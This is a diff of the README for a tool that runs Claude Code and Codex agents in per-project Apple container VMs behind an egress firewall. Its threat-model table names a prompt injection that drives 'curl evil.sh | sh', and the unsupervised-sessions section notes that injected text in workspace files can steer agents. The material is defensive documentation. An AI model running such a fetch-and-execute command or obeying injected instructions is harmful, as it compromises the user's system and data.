@@ -1,12 +1,21 @@
 # project-sandbox
 
-`project-sandbox` initializes a per-project sandbox for Claude Code and Codex CLI using Apple's `container` runtime. It generates a derived image context, sanitized agent configs, launcher scripts, and optional devcontainer output so the same environment can be used from an IDE.
+`project-sandbox` runs Claude Code and Codex CLI inside per-project Linux containers managed by Apple's [`container`](https://github.com/apple/container) runtime. Each container runs in its own VM with hardware-enforced isolation, so the box itself is the security boundary — the agents are configured to operate freely inside it.
 
-## Supported Path
+The tool generates a derived image, sanitized agent configs, an egress firewall, launcher scripts, and a parallel devcontainer specification so the same sandbox is reachable from VS Code, Cursor, JetBrains Gateway, GitHub Codespaces, or any Docker-compatible devcontainer client.
 
-The current implementation targets macOS with Apple's [`container`](https://github.com/apple/container) CLI installed and running. Use Debian or Ubuntu based images for v0.1, such as `python:3.12-slim`, because the generated Dockerfile installs firewall dependencies with `apt`.
+## What it does end-to-end
 
-The generated container runs agents as a non-root `agent` user. The container is treated as the primary sandbox boundary, and the generated Claude and Codex configs disable host-oriented approval prompts inside that boundary.
+Given `project-sandbox /path/to/repo python:3.12-slim`:
+
+1. Verify the `container` system service is running.
+2. Read host `git config --global` identity.
+3. Render `<project>/.project-sandbox/` — `Dockerfile`, `entrypoint.sh`, `init-firewall.sh`, sanitized `claude/settings.json` and `codex/config.toml`, a devcontainer post-start init script, and a per-project `.gitignore` that whitelists the assets meant to be committed.
+4. Build the image with `container build`.
+5. Render `<project>/.devcontainer/` with symlinks back into `.project-sandbox/` so the Dockerfile and firewall script remain a single source of truth.
+6. Generate `<project>/.project-sandbox/bin/run-claude` and `run-codex` launchers that invoke `container run` with `NET_ADMIN`/`NET_RAW` capabilities, the right bind mounts, and the host git identity threaded through environment variables.
+7. The container entrypoint wires git identity, copies credentials from the read-only host mount into the container's home, then runs the firewall before exec'ing the agent.
+8. Append agent-secret paths to `<project>/.gitignore` (idempotent).
 
 ## Install
 
@@ -19,96 +28,145 @@ uvx project-sandbox --help
 From a checkout:
 
 ```bash
-python -m pip install -e .
-project-sandbox --help
+uv sync
+uv run project-sandbox --help
 ```
 
-## First Run
-
-Generate the sandbox files, build the image, and start the default agent:
+## Quick start
 
 ```bash
-project-sandbox --agent both /absolute/path/to/repo python:3.12-slim
+uv run project-sandbox --agent both /absolute/path/to/repo python:3.12-slim
 ```
 
-For a planning pass that makes no changes and runs no containers:
+Use `--dry-run` to preview every action without writing files or starting the runtime:
 
 ```bash
-project-sandbox --dry-run --agent both /absolute/path/to/repo python:3.12-slim
+uv run project-sandbox --dry-run --agent both /absolute/path/to/repo python:3.12-slim
 ```
 
-Generate only the devcontainer files:
+## File layout
 
-```bash
-project-sandbox --devcontainer-only /absolute/path/to/repo python:3.12-slim
+```
+<project>/
+├── .gitignore                       # appended (idempotent): credential paths
+├── .project-sandbox/
+│   ├── .gitignore                   # whitelist of committed assets
+│   ├── Dockerfile                   # generated, committed
+│   ├── entrypoint.sh                # container PID 1
+│   ├── init-firewall.sh             # iptables/ipset egress allowlist
+│   ├── project-sandbox-devcontainer-init  # devcontainer postStart helper
+│   ├── claude/settings.json         # sanitized Claude config (committed)
+│   ├── codex/config.toml            # sanitized Codex config (committed)
+│   ├── bin/run-claude               # launcher → container run
+│   ├── bin/run-codex                # launcher → container run
+│   └── sessions/                    # unsupervised-mode logs (gitignored)
+└── .devcontainer/
+    ├── devcontainer.json            # generated
+    ├── Dockerfile          → ../.project-sandbox/Dockerfile
+    ├── init-firewall.sh    → ../.project-sandbox/init-firewall.sh
+    ├── claude              → ../.project-sandbox/claude
+    └── codex               → ../.project-sandbox/codex
 ```
 
-Run an unsupervised session from a prompt file:
+The Dockerfile, both sanitized configs, and `init-firewall.sh` are intended to be committed so the team gets a consistent dev environment from `git clone`. Credential files are not.
+
+## Devcontainer flow
+
+Open the project in VS Code, Cursor, or any devcontainer-aware IDE and choose **Reopen in Container**. The generated `devcontainer.json` builds the same image, mounts the same sanitized configs, runs the same firewall via `postStartCommand`, and waits for it before opening a terminal.
+
+Generate the devcontainer without building or running anything:
 
 ```bash
-project-sandbox \
+uv run project-sandbox --devcontainer-only /absolute/path/to/repo python:3.12-slim
+```
+
+This is useful for repos whose owners do not have `apple/container` installed but want the sandboxed agent environment for IDE or Codespaces use.
+
+## Unsupervised (fire-and-forget) sessions
+
+Run the agent without a TTY, starting from a prompt and writing all output to a log file:
+
+```bash
+uv run project-sandbox \
   --agent claude \
   --prompt /absolute/path/to/prompt.txt \
-  --log /absolute/path/to/session.log \
   /absolute/path/to/repo \
   python:3.12-slim
 ```
 
-## Generated Files
+- `--prompt FILE` bind-mounts the file at `/workspace/.project-sandbox-prompt`.
+- `--prompt-text "…"` passes the prompt via env var (or via a temp file if longer than 4096 chars).
+- `--log FILE` overrides the default log path under `.project-sandbox/sessions/<agent>-main-<timestamp>.log`.
+- `--timeout SECONDS` kills the container if the agent runs too long; the launcher returns exit code `124` on timeout.
+- The agent's exit code is propagated, so CI pipelines can detect failures.
 
-By default the tool writes:
+Unsupervised sessions implicitly skip the interactive `-it` flags, switch the dispatch to `claude-headless` / `codex-headless`, and run with `--dangerously-skip-permissions` (Claude) or `approval_policy = "never"` (Codex). The container is still the sandbox boundary; review the diff before integrating.
 
-- `.project-sandbox/Dockerfile`
-- `.project-sandbox/entrypoint.sh`
-- `.project-sandbox/init-firewall.sh`
-- `.project-sandbox/claude/settings.json`
-- `.project-sandbox/codex/config.toml`
-- `.project-sandbox/bin/run-claude`
-- `.project-sandbox/bin/run-codex`
-- `.devcontainer/devcontainer.json`
-- `.devcontainer` symlinks to selected `.project-sandbox` assets
+A maliciously crafted file in the workspace (e.g. a prompt-injection in a README) can still steer an unsupervised agent. Use narrow prompts and inspect the diff before merging.
 
-The tool also appends project-sandbox secret paths to the project `.gitignore`.
+## Network firewall
 
-## Network Firewall
+When the firewall is enabled (default), `init-firewall.sh` runs as root inside the container and:
 
-When the firewall is enabled, launcher scripts add `NET_ADMIN` and `NET_RAW` capabilities so the entrypoint can install an `iptables`/`ipset` egress allowlist before starting the agent. The allowlist includes GitHub, Anthropic, npm, and Codex's OpenAI API endpoint when Codex is installed.
+- Sets `iptables` and `ip6tables` policies to DROP.
+- Pins DNS to the resolver(s) in `/etc/resolv.conf` only (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
+- Allows GitHub's published IP ranges (fetched from `api.github.com/meta`), `registry.npmjs.org`, `api.anthropic.com`, statsig, sentry, plus `api.openai.com` when Codex is installed.
+- Allows the host gateway subnet so port-forwarding and IDE attach work.
+- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable. `--no-ipv6-firewall` accepts that fallback even when `sysctl` also fails (use sparingly).
 
-Use `--extra-domain DOMAIN` to allow additional package registries or internal services. Use `--no-firewall` only for trusted debugging scenarios.
+Customize:
 
-## Current Limitations
+- `--extra-domain DOMAIN` — append entries to the allowlist (private npm registries, internal APIs, etc.). Repeatable.
+- `--firewall-allow-openai` — explicitly allow `api.openai.com` even when Codex is not installed.
+- `--no-firewall` — skip the firewall entirely (trusted-LAN debugging only).
 
-- `--branch` is temporarily disabled. The first implementation mounted only the worktree directory, but Git worktrees need additional metadata from the main repository to make `git` commands work inside the container. This needs a safer metadata-mount design before re-enabling.
-- Base images should be Debian or Ubuntu based.
-- Apple `container` is required for launcher execution. Devcontainer output can be used with Docker-compatible devcontainer tooling.
-- Credentials are copied from mounted `~/.claude` and `~/.codex` directories into the container. With `--credentials-mode ro`, refresh tokens may not be persisted back to the host.
-- Env vars passed to `container run` can be visible in runtime logs. Tokens are passed through mounted files, not env vars.
+## Threat model
+
+| Threat | Mitigation |
+|---|---|
+| Agent reads `~/.ssh`, `~/Library`, etc. | VM boundary (`apple/container` `Virtualization.framework`); only `/workspace` is mounted. |
+| Agent deletes the wrong project directory | Only the project path is mounted; everything else lives in the disposable VM. |
+| Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
+| DNS tunneling exfiltration | DNS restricted to the in-VM resolver only. |
+| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
+| Malicious npm post-install scripts | Run as UID 1000 inside the VM; no host access. |
+| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
+| API token leakage to other host processes | The token lives inside the VM, not in the macOS Keychain. |
+
+The tool does **not** protect against:
+
+- Exfiltration via whitelisted endpoints (e.g. committing secrets to a GitHub repo).
+- Misuse of an agent's own API token (it is by definition available to the agent).
+- IPv6 egress when `ip6_tables` is unavailable, `sysctl` cannot disable IPv6, **and** `--no-ipv6-firewall` is set.
+
+## Troubleshooting
+
+- **`container system start` failed.** Make sure macOS 15+ is current and `apple/container` is installed; the tool calls `container system start` idempotently before building.
+- **Build OOM.** The builder VM is separate from run VMs. Bump it: `container builder start --memory 8g --cpus 8`, then re-run with `--rebuild`.
+- **GitHub meta API timeout.** The firewall script falls back to an empty `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the agent later (with the firewall flushed and rebuilt at container start) will retry.
+- **`ip6tables` unavailable.** The script attempts `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that fails too, the script aborts unless `--no-ipv6-firewall` is set.
+- **Credentials look stale.** With `--credentials-mode ro`, refresh tokens cannot be written back; use the default `rw` for long-running setups.
+- **Env vars in `vminitd.log`.** apple/container [logs the full process environment](https://github.com/apple/container/discussions/1153). Tokens are passed through mounted credential files only; identity env vars are low-sensitivity.
+
+## Limitations
+
+- Base images must be Debian or Ubuntu based — the firewall depends on `apt` packages including `aggregate`, which Alpine does not ship.
+- Apple `container` is required to run the launchers. The generated `.devcontainer/` works with any Docker-compatible runtime (Docker Desktop, OrbStack, Codespaces).
+- `--branch` (worktree mode) is reserved for a future release. The CLI accepts the flag and exits with an explanation; the same workflow can be approximated today by running the tool against an externally-managed worktree path.
+- `jj` is installed in the container for users who want to shell in and use it, but the tool itself does not write any jj configuration. Configure jj inside the container yourself if you need it.
 
 ## Development
 
-This repository includes a devcontainer for local development. Open the checkout in VS Code or Cursor and choose "Reopen in Container".
-
-Create a local uv-managed virtualenv:
-
 ```bash
-uv venv --python 3.12 .venv
-uv pip install --python .venv/bin/python -e . pytest
+uv sync
+uv run python -m compileall src tests
+uv run pytest -q
 ```
 
-Run static syntax checks:
+Tests cover CLI surface, dry-run non-mutation, renderer output, launcher shell quoting, container `argv` construction, devcontainer JSON validity and symlinks, gitignore helpers, and Python-native unsupervised-session timeout handling.
 
-```bash
-.venv/bin/python -m py_compile $(find src tests -name '*.py')
-```
-
-Run tests:
-
-```bash
-.venv/bin/python -m pytest -q
-```
-
-The tests cover basic CLI smoke behavior, dry-run non-mutation, renderer output, launcher shell quoting, command construction, jj config rendering, and Python-native unsupervised-session timeout handling.
+The full original design lives in [`docs/PLAN.md`](docs/PLAN.md).
 
 ## Acknowledgements
 
-This project was inspired by [agentbox](https://github.com/fletchgqc/agentbox/tree/main), which pioneered the pattern of running AI coding agents inside disposable container sandboxes.
+Inspired by [agentbox](https://github.com/fletchgqc/agentbox/tree/main), which pioneered the pattern of running AI coding agents inside disposable container sandboxes.
